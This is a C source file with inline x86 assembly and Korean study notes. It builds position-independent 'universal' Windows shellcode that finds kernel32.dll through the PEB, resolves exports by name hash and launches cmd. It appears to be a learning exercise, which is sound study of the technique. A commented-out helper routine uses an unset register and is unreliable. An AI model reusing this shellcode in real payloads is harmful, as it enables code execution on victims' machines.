
/*
SW_SHOW value is for using WinExec API
UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);
UINT: unsigned int
LPCSTR: long pointer constant string (const char *)
...
unsigned int WinExec(
	const char *lpCmdLine,
	unsigned int uCmdShow
);
*/
#define SW_SHOW 5

/*
purpose:		universal-shellcode
programmer:	woohyuk seo (서우혁)
doc write date: 	12/19/2019
compiler: 	Visual Studio 2019 C++
universal shellcode는 kernel32.dll이 export하는 주소가 매번 바뀌어서 call하는 주소가 유효하지 않게된다
정적으로 만들어진 일반적인 쉘코드의 한계를 극복하기 위해서 만들어졌다.
kenrel32.dll이 process에 mapping되었을때, 해당 kernel32.dll을 얻어낸다음
함수의 주소를 계산한다.
kernel32.dll이 mapping된 곳은 PEB라고한다.
따라서..
universal shellcode를 만들기 위해서 PEB(process environment block)의 위치를 구해야한다.
PEB의 위치를 구하는 과정에서 fs register를 이용한다.
user mode의 fs register는 현재 프로세서의 TEB(thread environment block) 를 가르키고있다.
kernel mode의 fs register는 KPCR (processor control region) 를 가르키고있다. (앞에 붙는 K의 뜻은 kernel의 약자같다.)
KPCR은 schedule info들이 저장된다. (실행될 스레드들의 정보들, 큐 정보, ... 라고 한다.
fs:0x30위치에 PEB가 존재한다.
구조는 다음과 같다.
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
  PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8
  //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
PEB에서 (2 + 1 + 1 + 4 + 4 = 12) 만큼 더하면 PPEB_LDR_DATA Ldr (포인터 변수)의 주소가 나옴
Loade_export가 가르키는 주소에서, (8 + (4 * 3) = 20)  만큼 더하면 LIST_ENTRY InMemoryOrderModuleList 의 주소가 나옴
InMemoryOrderModuleList 은 이중링크를 가지고 있다.
정보는 다음과 같다
.
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
FLink는 Front Link, BLink는 Back Link라는 뜻임 (맨 마지막 링크는 NULL을 가르키고있음)
각각 링크는 LDR_DATA_TABLE_ENTRY를 가르키고있다.
LDR_DATA_TABLE_ENTRY는 해당 프로세스가 로드한 DLL의 정보를 가지고있다.
정보는 다음과 같다.
typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
여기서 주의해야 할 점은, Reserved1멤버부터 계산하지 않고, InMemoryOrderLinks부터 계산하여,  ((4 * 2) + (4 * 2)) = 16byte만큼 더하여 DllBase에 접근해야 한다는 점이다.
이유는 InMemoryOrderLinks는 이중리스트이다, 당연히 계산했을때, Front Link부터 참조될것이다.
Front Link부터 참조됨으로 32비트환경에서의 메모리주소크기 (4byte) 4개 뒤에 DllBase가 존재한다.
DllBase는 mapping된 DLL의 주소를 가지고있다.
DllBase가 가르키는 주소를 register에 참조시키는 방법은 역참조를 사용해야한다.
mov는 레지스터, 변수를 4바이트만큼 복사한다. (movzx, movsx, movs)같은 명령은 4바이트보다 적거나, 큰 바이트를 복사한다.
intel문법에서, 4바이트 역참조의 표현은 다음과 같다. mov register, [register]
DllBase는 LPVOID형식임으로 mov를 사용한다.
C의 함수에서, ebp 레지스터로 부터 덧셈을 진행하면 함수인자값이, 뺄셈을 진행하면 local variable area 가 나온다.
GetApiAddress 함수는 호환성과 이식성을 위해서 남겨둔다.
int GetApiAddress(int ModuleAddress, const char* Name)
{
	int r = 0;
	__asm
	{
		mov edi, [ebp + 8]; //ModuleAddress
		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY
		mov [ebp - 12], edx;
	//get string hash
		xor eax, eax;
		xor ecx, ecx;
		xor esi, esi;
		mov ebx, [ebp + 12];
	_NAME_HASH:;
		movsx edx, byte ptr[ebx + ecx];
		add ecx, 1;
		add eax, edx;
		cmp edx, esi;
		jne _NAME_HASH;
		mov [ebp - 16], eax;
	//find api name
		mov eax, [ebp - 12];
		add eax, 32;
		mov eax, [eax];
		add eax, [ebp + 8];
		xor esi, esi;
	_LOOP:;
		mov ebx, [eax + esi * 4];
		add ebx, [ebp + 8];
		xor ecx, ecx;
		xor edi, edi;
	__LOOP:;
		movsx edx, byte ptr[ebx + ecx];
		add edi, edx;
		add ecx, 1;
		cmp edx, 0;
		jne __LOOP;
		cmp edi, [ebp - 16];
		je BREAK_LABLE;
		add esi, 1;
		jmp _LOOP;
	BREAK_LABLE:;
		//get ordinal number of the function
		mov ebx, [ebp - 12];
		add ebx, 36;
		mov ebx, [ebx];
		mov eax, 2;
		mov ecx, esi;
		mul ecx;
		add ebx, eax;
		add ebx, [ebp + 8];
		movsx edx, word ptr[ebx];
		//ordinal is started from one
		add edx, 1;
		//get function address
		mov ebx, [ebp - 12];
		add ebx, 28;
		mov ebx, [ebx];
		add ebx, [ebp + 8];
		mov eax, 4;
		mul edx;
		sub eax, 4;
		add ebx, eax;
		mov ebx, [ebx];
		add ebx, [ebp + 8];
		mov eax, ebx;
		mov r, ebx;
	}
	return r;
}
*/


int main()
{
	__asm
	{
		push ebp;
		sub esp, 64;

		//eax 레지스터에 PEB저장
		mov eax, fs:0x30;

		//PEB로부터 12다음 주소는 LDR, 역참조를 통해서 멤버에 접근
		mov eax, [eax + 12];
		//멤버에서 20만큼 더하면, LIST_ENTRY InMemoryOrderModuleList이다. 역참조를 통해서 Flink에 접근한다.
		mov eax, [eax + 20];

		//FLINK를 통해서 entry에 접근한다. 
		//doubly linked list임으로 역참조를 통해서 다음 entry에 접근할수있다.

	GET_NEXT_LINK:;
		mov eax, [eax];
		movsx ebx, word ptr[eax + 36];

		//24 is kernel32.dll unicode string length
		cmp ebx, 24;
		jne GET_NEXT_LINK;


		//실행파일의 실제 주소 (MZ)를 구한다. flink를 이용해 얻어낸 entry로 부터 16다음 주소에 있다.
		mov ebx, [eax + 16];

		//module address
		mov[ebp - 24], ebx;

		mov edi, ebx;

		//DOS to NT
		mov eax, [ebx + 0x3c];
		add eax, ebx;

		//NT to Export Table
		mov eax, [eax + 120];
		add eax, ebx;

		//export table..

		//number of names
		mov ecx, [eax + 24];
		mov[ebp - 8], ecx;

		//Export Address Table
		mov ecx, [eax + 28];
		mov[ebp - 12], ecx;

		//Export Name Table	
		mov ecx, [eax + 32];
		mov[ebp - 16], ecx;

		//Export Ordinal Table
		mov ecx, [eax + 36];
		mov[ebp - 20], ecx;


		jmp SHELLCODE_MAIN;

	_GetProcAddress:;
		//eax is function name hash
		//edi is return value
		//The return value is exported function's address of the kernel32.dll

		//ebp - 16 is holds NPT
		mov ebx, [ebp - 16];

		//NPT rva to va

		add ebx, [ebp - 24];

		xor edi, edi;

	_GetFunctionName:;
		mov edx, [ebx];
		add edx, [ebp - 24];

		xor esi, esi;

	_GetNameHash:;
		movsx ecx, byte ptr[edx];
		add edx, 1;

		add esi, ecx;

		cmp ecx, 0;
		jne _GetNameHash;

		add edi, 1;
		add ebx, 4;

		cmp edi, [ebp - 8];
		je _GetProcAddressRet;

		cmp esi, eax;
		jne _GetFunctionName;

		sub edi, 1;

		// index * 2;
		mov eax, 2;
		mul edi;
		//eax holds mul operation result		

		mov ebx, [ebp - 20];
		add ebx, eax;
		add ebx, [ebp - 24];

		movsx ecx, word ptr[ebx];

		mov eax, 4;
		mul ecx;

		//export address table
		mov edi, [ebp - 12];

		//get EAT
		add edi, eax;
		add edi, [ebp - 24];

		mov edi, [edi];
		add edi, [ebp - 24];

	_GetProcAddressRet:;

		ret;

	SHELLCODE_MAIN:;
		//edi holds function address

		//cmd null-terminate string
		xor eax, eax;
		mov[ebp + 0xc], eax;
		mov[ebp + 0xc], 0x63;
		mov[ebp + 0xd], 0x6d;
		mov[ebp + 0xe], 0x64;

		mov eax, 0x2b3;
		call _GetProcAddress;

		lea ecx, [ebp + 0xc];

		mov eax, 1
			push eax;
		push ecx;
		call edi;

		mov eax, 0x479;
		call _GetProcAddress;

		push 1;
		call edi;

		add esp, 64;
		pop ebp;

	}
}
